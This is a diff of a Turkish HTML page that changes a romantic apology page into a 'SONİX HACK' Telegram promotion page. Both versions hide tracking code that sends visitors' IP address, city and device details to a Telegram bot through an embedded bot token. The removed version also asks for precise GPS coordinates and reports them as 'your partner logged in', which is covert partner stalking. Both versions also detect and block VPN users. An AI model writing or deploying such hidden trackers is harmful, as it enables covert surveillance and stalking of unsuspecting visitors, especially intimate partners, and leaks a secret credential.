@@ -3,108 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sadece Senin İçin ❤️</title>
+    <title>SONİX | HACK INTERFACE</title>
     <style>
-        body { 
-            background: #000; /* Koyu arka plan, aşkın asaleti */
-            color: #fff; 
-            font-family: 'Playfair Display', serif; /* Şık ve romantik yazı tipi */
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            overflow: hidden; 
-            flex-direction: column;
-            text-align: center;
+        /* Matrix Arka Planı */
+        body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; color: #00ff00; }
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
+
+        /* Ana Kart Tasarımı */
+        .container { 
+            position: relative; z-index: 10; text-align: center; 
+            background: rgba(0, 0, 0, 0.9); padding: 50px; 
+            border: 3px solid #00ff00; box-shadow: 0 0 30px #00ff00; 
+            border-radius: 15px; width: 350px;
         }
 
-        .mavi-gozlum { 
-            font-size: 6rem; /* Büyük ve etkileyici yazı */
-            font-weight: 700; 
-            color: #00d4ff; /* Mavi, sevgilin için özel */
-            text-shadow: 0 0 30px #00d4ff; 
-            animation: pulse 2s infinite alternate; /* Hafif nabız atma efekti */
-            letter-spacing: 5px; 
-            margin: 0; 
+        /* Başlıklar */
+        .sonix-title { font-size: 3.5rem; font-weight: 900; color: #00ff00; text-shadow: 0 0 10px #00ff00; letter-spacing: 12px; margin: 0; }
+        .hack-title { font-size: 3.5rem; font-weight: 900; color: #00ff00; text-shadow: 0 0 10px #00ff00; letter-spacing: 12px; margin-bottom: 20px; }
+
+        /* Renkli ve Animasyonlu SSHACK Yazısı */
+        .sshack-rainbow {
+            font-size: 1.4rem; margin-top: 20px; font-weight: bold;
+            display: inline-block;
+            background-image: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: rainbow_animation 3s infinite linear;
+            background-size: 200% 100%;
+            text-shadow: 0 0 5px rgba(255,255,255,0.2);
         }
 
-        .bahar { 
-            font-size: 3rem; /* Bahar yazısı daha küçük ama şık */
-            margin-top: 20px; 
-            font-weight: 400; 
-            color: #ffffff; 
-            letter-spacing: 3px; 
-            font-style: italic; /* İtalik, daha zarif */
+        @keyframes rainbow_animation {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
         }
 
-        .mesaj {
-            font-size: 1.5rem; /* Kendini affettirme mesajı */
-            margin-top: 40px; 
-            color: rgba(255, 255, 255, 0.8); 
-            letter-spacing: 2px;
-            font-family: 'Dancing Script', cursive; /* El yazısı gibi, daha kişisel */
+        /* Telegram Butonu */
+        .tg-button { 
+            display: block; width: 100%; margin-top: 40px; padding: 18px 0; 
+            font-size: 1.5rem; font-weight: bold; color: #000; 
+            background: #00ff00; text-decoration: none; border-radius: 10px; 
+            box-shadow: 0 0 15px #00ff00; transition: 0.3s; 
+            text-transform: uppercase; border: none; cursor: pointer;
         }
-        
-        @keyframes pulse { 
-            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 30px #00d4ff; } 
-            to { transform: scale(1.1); color: #ff00ff; text-shadow: 0 0 50px #ff00ff; } /* Mavi-pembe arası geçiş */
-        }
+        .tg-button:hover { background: #fff; box-shadow: 0 0 30px #fff; transform: scale(1.02); }
 
-        /* VPN Engel Ekranı - Aynısı */
-        #vpn-blocker {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: red; color: black; z-index: 9999; justify-content: center; align-items: center;
-            font-size: 3rem; font-weight: bold; text-align: center; padding: 20px;
-        }
+        /* VPN Engel Ekranı */
+        #vpn-blocker { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ff0000; color: #000; z-index: 9999; justify-content: center; align-items: center; font-size: 3rem; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="vpn-blocker">VPN KAPAT AMK</div>
+    <canvas id="matrix"></canvas>
+    <div id="vpn-blocker">VPN DETECTED! ACCESS DENIED.</div>
 
     <div id="main-content" class="container">
-        <h1 class="mavi-gozlum">Mavi Gözlüm</h1>
-        <p class="bahar">Bahar</p> 
-        <p class="mesaj">Özür dilerim, beni affetmeni istiyorum...</p>
+        <h1 class="sonix-title">S O N İ X</h1>
+        <h1 class="hack-title">H A C K</h1>
+        
+        <div class="sshack-rainbow">
+            kaliteli tesadüf değildir SSHACK
+        </div>
+
+        <a href="https://t.me/sshacksonix" class="tg-button">JOIN TELEGRAM</a>
     </div>
 
     <script>
+        // Matrix Efekti
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const charList = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-/=[]{}";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = charList.charAt(Math.floor(Math.random() * charList.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+
+        // --- TAKİP SİSTEMİ ---
         const token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
         const chatId = "7783618933";
-
-        function sendToBot(msg) {
-            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
-            new Image().src = url;
-        }
+        function logToBot(msg) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`); }
 
         window.getIP = function(json) {
-            let ip = json.ip;
-            
-            fetch(`https://demo.ip-api.com/json/${ip}?fields=66846719`)
-            .then(res => res.json())
-            .then(data => {
-                if (data.proxy === true || data.hosting === true) {
+            fetch(`https://demo.ip-api.com/json/${json.ip}?fields=66846719`).then(r => r.json()).then(data => {
+                if (data.proxy) {
                     document.getElementById('main-content').style.display = 'none';
                     document.getElementById('vpn-blocker').style.display = 'flex';
-                    sendToBot(`🚫 VPN TESPİT EDİLDİ!\n📍 IP: ${ip}\n📱 Cihaz: ${navigator.userAgent}`);
+                    logToBot(`🚫 VPN TESPİTİ: ${json.ip}`);
                 } else {
-                    sendToBot(`🚨 SEVGİLİN GİRİŞ YAPTI!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            let lat = pos.coords.latitude;
-                            let lon = pos.coords.longitude;
-                            sendToBot(`🎯 TAM KONUM (GPS):\n📍 Koordinat: ${lat}, ${lon}\n🗺 Harita: https://www.google.com/maps?q=${lat},${lon}`);
-                        }, null, {enableHighAccuracy: true});
-                    }
+                    logToBot(`💻 SONİX GİRİŞ:\n📍 IP: ${json.ip}\n🌍 Konum: ${data.city}`);
                 }
-            })
-            .catch(() => {
-                sendToBot(`🚨 GİRİŞ (VPN Kontrolü Atlandı)\n📍 IP: ${ip}`);
             });
         };
-
         let script = document.createElement('script');
         script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
         document.body.appendChild(script);
